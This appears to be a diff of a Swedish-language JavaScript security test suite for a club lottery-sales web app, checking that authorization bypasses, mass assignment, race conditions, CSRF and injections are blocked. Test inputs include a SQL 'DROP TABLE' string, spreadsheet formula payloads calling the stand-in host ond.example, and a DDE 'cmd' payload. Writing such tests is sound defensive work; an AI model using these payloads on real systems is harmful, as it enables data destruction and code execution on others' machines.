@@ -25,8 +25,8 @@ async function klubb() {
   const li = await m.loggaIn(KL, ADMIN_EPOST);
   const H = m.somAdmin(li.kaka);
   const sk = (op, extra, slug = "*", kl = KL) => m.admin(kl, slug, "", op, extra, H);
-  const a = await sk("lagNy", { data: lagData({ namn: "Lag A" }) });
-  const b = await sk("lagNy", { data: lagData({ namn: "Lag B" }) });
+  const a = await m.nyttLag(KL, lagData({ namn: "Lag A" }));
+  const b = await m.nyttLag(KL, lagData({ namn: "Lag B" }));
   assert.ok(a.ok && b.ok, "uppsättningen misslyckades");
   const bestall = (lag, o = {}, kl = KL) => m.post({ klubb: kl, lag, barn: "Emil", mobil: "070 123 45 67", antal: 2, samtycke: true, website: "", t: 5000, ...o });
   const oa = await bestall("lag-a", { barn: "Alva", mobil: "070 111 11 11" });
@@ -121,9 +121,7 @@ const ATTACKER = [
     async kor() {
       const { a, kaka } = await klubb();
       await m.skapaKlubb("klubb2", "Klubb 2", { admins: ["annan@klubb2.example"] });
-      const li2 = await m.loggaIn("klubb2", "annan@klubb2.example");
-      const H2 = m.somAdmin(li2.kaka);
-      const a2 = await m.admin("klubb2", "*", "", "lagNy", { data: lagData({ namn: "Lag A" }) }, H2);
+      const a2 = await m.nyttLag("klubb2", lagData({ namn: "Lag A" }));
       await m.post({ klubb: "klubb2", lag: "lag-a", barn: "Karin", mobil: "070 333 33 33", antal: 1, samtycke: true, website: "", t: 5000 });
       const s1 = await m.admin("klubb2", "lag-a", a.key, "lista");                    // klubb 1:s lagnyckel mot klubb 2
       const s2 = await m.admin("klubb2", "lag-a", "", "lista", {}, m.somAdmin(kaka));    // klubb 1:s administratör mot klubb 2
@@ -135,22 +133,56 @@ const ATTACKER = [
     } },
 
   // ---------- Mer behörighet ----------
-  { grupp: "Mer behörighet", namn: "Lagföräldern godkänner sin egen försäljning",
-    hur: "Lagförälderns nyckel anropar klubbadministratörens åtgärder: godkänna, skapa lag, ny nyckel, ta bort lag, ändra lag och se alla lag.",
+  { grupp: "Mer behörighet", namn: "Lagföräldern gör klubbens jobb",
+    hur: "Lagförälderns nyckel anropar klubbadministratörens åtgärder: godkänna, stoppa, skicka tillbaka, ny nyckel, ta bort lag och se alla lag.",
     async kor() {
       const { a } = await klubb();
-      const ops = [["godkann", { slug: "lag-a", till: "pagar" }], ["lagNy", { data: lagData({ namn: "Lag X" }) }], ["nyNyckel", { slug: "lag-b" }],
-        ["lagTaBort", { slug: "lag-b" }], ["lagUppdatera", { slug: "lag-b", falt: { status: "avslutad" } }], ["lagLista", {}], ["skickaTillbaka", { slug: "lag-a", kommentar: "x" }]];
+      const u = await m.nyttLag(KL, lagData({ namn: "Lag U", status: "utkast" }));
+      await m.db.prepare("UPDATE lag SET status = 'granskas' WHERE slug = 'lag-u'").run();
+      const ops = [["godkann", { slug: "lag-u" }], ["stoppa", { slug: "lag-b", kommentar: "x" }], ["nyNyckel", { slug: "lag-b" }],
+        ["lagTaBort", { slug: "lag-u" }], ["lagLista", {}], ["skickaTillbaka", { slug: "lag-u", kommentar: "x" }]];
       const svar = [];
       for (const [op, x] of ops) svar.push(await m.admin(KL, "lag-a", a.key, op, x));
-      const ok = svar.every((s) => !s.ok) && (await m.get({ action: "lag", klubb: KL })).lag.length === 2;
-      return { anrop: "POST {lag:'lag-a', key:<lagnyckel>, op:'godkann' | 'lagNy' | 'nyNyckel' | 'lagTaBort' | 'lagUppdatera' | 'lagLista'}", svar: kort(svar[0]), stoppad: ok, bevis: svar[0].fel };
+      const rader = await m.rader("lag"), st = (slug) => rader.find((r) => r.slug === slug).status;
+      const ok = svar.every((s) => !s.ok) && rader.length === 3 && st("lag-u") === "granskas" && st("lag-b") === "pagar"
+        && (await m.admin(KL, "lag-u", u.key, "oversikt")).ok;
+      return { anrop: "POST {lag:'lag-a', key:<lagnyckel>, op:'godkann' | 'stoppa' | 'nyNyckel' | 'lagTaBort' | 'lagLista' | 'skickaTillbaka'}", svar: kort(svar[0]), stoppad: ok, bevis: svar[0].fel };
+    } },
+  { grupp: "Mer behörighet", namn: "Klubbens administratör ändrar försäljningens uppgifter",
+    hur: "Inloggad som klubbens administratör: byter Swish-nummer och pris i ett lags utkast, och öppnar, avslutar och öppnar för ändring i stället för lagföräldern.",
+    async kor() {
+      const { sk } = await klubb();
+      await m.nyttLag(KL, lagData({ namn: "Lag U", status: "utkast" }));
+      const fore = await m.rader("lag");
+      const svar = [await sk("lagSpara", { falt: { swishNummer: "070 999 99 99", pris: 1 } }, "lag-u"), await sk("lagSpara", { slug: "lag-a", falt: { swishNummer: "070 999 99 99" } }, "lag-a"),
+        await sk("avsluta", {}, "lag-a"), await sk("andra", {}, "lag-b"), await sk("oppna", {}, "lag-u")];
+      const efter = await m.rader("lag");
+      const orort = JSON.stringify(efter) === JSON.stringify(fore);
+      return { anrop: "POST {op:'lagSpara' | 'avsluta' | 'andra' | 'oppna'} med klubbadministratörens cookie", svar: kort(svar[0]), stoppad: svar.every((s) => !s.ok) && orort, bevis: svar[0].fel };
+    } },
+  { grupp: "Mer behörighet", namn: "Öppna en försäljning som klubben inte har godkänt",
+    hur: "Lagföräldern väljer Öppna på ett utkast, på en försäljning som väntar på granskning och på en som klubben har stoppat, och på en som hen själv öppnat för ändring och bytt Swish-nummer i.",
+    async kor() {
+      const { sk, a, b, bestall } = await klubb();
+      const u = await m.nyttLag(KL, lagData({ namn: "Lag U", status: "utkast" }));
+      const g = await m.nyttLag(KL, lagData({ namn: "Lag G", status: "utkast" }));
+      await m.db.prepare("UPDATE lag SET status = 'granskas' WHERE slug = 'lag-g'").run();
+      await sk("stoppa", { slug: "lag-a", kommentar: "Fel Swish-nummer" });
+      await m.admin(KL, "lag-b", b.key, "andra");
+      await m.admin(KL, "lag-b", b.key, "lagSpara", { falt: { swishNummer: "070 999 99 99" } });
+      const svar = [await m.admin(KL, "lag-u", u.key, "oppna"), await m.admin(KL, "lag-g", g.key, "oppna"), await m.admin(KL, "lag-a", a.key, "oppna"), await m.admin(KL, "lag-b", b.key, "oppna")];
+      const rader = await m.rader("lag"), st = (slug) => rader.find((r) => r.slug === slug).status;
+      const lista = JSON.stringify(await m.get({ action: "lag", klubb: KL }));
+      const nya = [await bestall("lag-a", { mobil: "070 310 00 01" }), await bestall("lag-b", { mobil: "070 310 00 02" })];
+      const ok = svar.every((s) => !s.ok) && st("lag-u") === "utkast" && st("lag-g") === "granskas" && st("lag-a") === "utkast" && st("lag-b") === "utkast"
+        && !lista.includes("999 99 99") && nya.every((s) => !s.ok) && (await antal("bestallning")) === 3;
+      return { anrop: "POST {op:'oppna'} för utkast, granskas, stoppad och ändrad försäljning", svar: kort(svar[2]), stoppad: ok, bevis: svar[0].fel };
     } },
   { grupp: "Mer behörighet", namn: "Smyga in status, nyckel, adress och räknare när försäljningen sparas",
     hur: "Lagföräldern sparar sitt utkast och lägger till status, slug, nyckelns hash, id, klubb och ordernummer i datan, även som kolumnnamn i en SQL-liknande text.",
     async kor() {
       const { sk } = await klubb();
-      const u = await sk("lagNy", { data: lagData({ namn: "Lag U", status: "utkast" }) });
+      const u = await m.nyttLag(KL, lagData({ namn: "Lag U", status: "utkast" }));
       const fore = (await m.rader("lag")).find((r) => r.slug === "lag-u");
       const svar = await m.admin(KL, "lag-u", u.key, "lagSpara", { falt: { status: "pagar", slug: "lag-a", nyckel_hash: "0".repeat(64), id: 1, klubb_id: 2, nasta_order: 900, namn: "Lag A", pris: 30,
         "pris = 0, nyckel_hash": "x", "__proto__": { status: "pagar" }, constructor: { prototype: { status: "pagar" } } } });
@@ -193,7 +225,7 @@ const ATTACKER = [
       const { sk, bestall } = await klubb();
       const st = ["utkast", "granskas", "snart", "avslutad"];
       for (const [i, s] of st.entries()) {
-        const ny = await sk("lagNy", { data: lagData({ namn: "Lag S" + i, status: s === "granskas" ? "utkast" : s }) });
+        const ny = await m.nyttLag(KL, lagData({ namn: "Lag S" + i, status: s === "granskas" ? "utkast" : s }));
         if (s === "granskas") await m.db.prepare("UPDATE lag SET status = 'granskas' WHERE slug = ?1").bind(ny.slug).run();
       }
       const svar = [];
@@ -251,7 +283,7 @@ const ATTACKER = [
     hur: "Laget har 1 lott kvar. 20 föräldrar beställer exakt samtidigt (alla anrop skickas på en gång mot en riktig D1 lokalt). Lasttest mot riktiga Cloudflare återstår innan skarp drift.",
     async kor() {
       const { sk, bestall } = await klubb();
-      await sk("lagNy", { data: lagData({ namn: "Lag L", lager: 3, minimum: 0 }) });
+      await m.nyttLag(KL, lagData({ namn: "Lag L", lager: 3, minimum: 0 }));
       await bestall("lag-l", { antal: 2, mobil: "070 800 00 99" });   // 1 kvar
       const svar = await Promise.all(Array.from({ length: 20 }, (_, i) => bestall("lag-l", { antal: 1, mobil: "070" + String(8100000 + i) })));
       const gick = svar.filter((s) => s.ok).length;
@@ -278,7 +310,7 @@ const ATTACKER = [
     hur: "Fält och parametrar får SQL-text, till exempel '; DROP TABLE lag; --: klubb, lag, barn, mobil, nyckel, e-post, kommentar och namn på fält. Inget ska tolkas som SQL, och alla tabeller och rader ska finnas kvar.",
     async kor() {
       const { sk, a } = await klubb();
-      const u = await sk("lagNy", { data: lagData({ namn: "Lag Q", status: "utkast" }) });
+      const u = await m.nyttLag(KL, lagData({ namn: "Lag Q", status: "utkast" }));
       const radFore = { lag: await antal("lag"), best: await antal("bestallning"), klubb: await antal("klubb"), admin: await antal("klubb_admin") };
       let fel = [];
       let kodOrdrar = 0;   // en ogiltig kod ignoreras, och beställningen är i övrigt giltig: den ska sparas, med kod tom
@@ -317,7 +349,7 @@ const ATTACKER = [
     async kor() {
       const { sk, bestall } = await klubb();
       const s1 = await bestall("lag-a", { barn: "=HYPERLINK(\"http://ond.example\";\"Klicka\")", mobil: "070 910 00 00" });
-      const u = await sk("lagNy", { data: lagData({ namn: "Lag F", status: "utkast" }) });
+      const u = await m.nyttLag(KL, lagData({ namn: "Lag F", status: "utkast" }));
       await m.admin(KL, "lag-f", u.key, "lagSpara", { falt: { produkt: "=IMPORTXML(\"http://ond.example\")", detalj: "+cmd|' /C calc'!A0", intro: "@SUM(1+1)", belonning: "-1+1", mottagare: "=1+1" } });
       const rad = (await m.rader("lag")).find((r) => r.slug === "lag-f");
       const formler = ["produkt", "detalj", "intro", "belonning", "mottagare"].filter((f) => /^[=+\-@]/.test(rad[f]));
@@ -344,7 +376,7 @@ const ATTACKER = [
     hur: "Laget sätter priset 19,90 kr. En förälder beställer 3. Beloppet ska bli 59,70, inte 59,699999999999996, eftersom det kopieras in i Swish.",
     async kor() {
       const { sk, bestall } = await klubb();
-      await sk("lagNy", { data: lagData({ namn: "Lag P", pris: 19.9 }) });
+      await m.nyttLag(KL, lagData({ namn: "Lag P", pris: 19.9 }));
       const svar = await bestall("lag-p", { antal: 3, mobil: "070 930 00 00" });
       const rad = (await m.rader("bestallning")).pop();
       return { anrop: "POST {lag:'lag-p', antal:3} med pris 19,90", svar: kort(svar), stoppad: svar.belopp === 59.7 && rad.belopp === 59.7, bevis: "belopp: " + svar.belopp };
@@ -409,7 +441,7 @@ const ATTACKER = [
     hur: "Administratören är inloggad. En annan webbplats får hens webbläsare att skicka ett anrop som tar bort ett lag och byter nyckel (Origin pekar på den andra webbplatsen, eller saknas).",
     async kor() {
       const { sk, kaka } = await klubb();
-      const u = await sk("lagNy", { data: lagData({ namn: "Lag U", status: "utkast" }) });
+      const u = await m.nyttLag(KL, lagData({ namn: "Lag U", status: "utkast" }));
       const fran = ["https://ond.example", "null", undefined];
       const svar = [];
       for (const o of fran) {
